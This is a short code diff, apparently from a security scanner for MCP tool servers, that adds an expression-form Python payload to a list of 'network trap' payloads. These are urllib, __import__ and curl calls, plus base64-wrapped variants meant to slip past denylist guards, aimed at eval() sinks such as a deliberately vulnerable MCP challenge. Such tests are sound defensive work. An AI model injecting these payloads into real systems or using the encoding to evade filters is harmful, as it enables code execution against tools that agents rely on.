@@ -71,9 +71,15 @@ def _b64(text: str) -> str:
 
 def _network_trap_payloads(url: str) -> list[str]:
     python_payload = f"import urllib.request; urllib.request.urlopen({url!r})"
+    # Expression form (no statements) — for eval()-style sinks that accept a
+    # single expression, where the import-statement flavor above is a
+    # SyntaxError and never runs. DVMCP challenge 8's evaluate_expression does
+    # exactly eval(arg).
+    python_expr_payload = f"__import__('urllib.request', fromlist=['urlopen']).urlopen({url!r})"
     shell_payload = f"curl -s {url}"
     return [
         python_payload,
+        python_expr_payload,
         shell_payload,
         # base64-wrapped flavors — bypass a guard that denylists the plain
         # substrings ("urllib", "curl", "http://") above but never decodes
